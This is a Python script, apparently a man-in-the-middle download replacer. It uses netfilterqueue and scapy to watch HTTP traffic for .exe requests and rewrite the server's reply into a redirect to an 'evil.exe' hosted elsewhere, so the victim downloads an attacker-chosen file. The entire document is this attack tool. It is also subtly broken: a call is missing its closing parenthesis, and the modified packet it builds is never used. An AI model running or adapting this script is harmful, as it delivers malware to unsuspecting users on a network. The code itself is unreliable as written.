#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

ack_list = []
def set_load(packet, load):
    packet[scapy.Raw].load = load

    del packet[scapy.IP].len
    # After being deleted scapy will automatically calculate these values.
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet
    
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in str(scapy_packet[scapy.Raw].load):
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.example.org/evil.exe\n\n"
                
                packet.set_payload(bytes(scapy_packet))
                # set_payload() expects a bytes-object
        
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
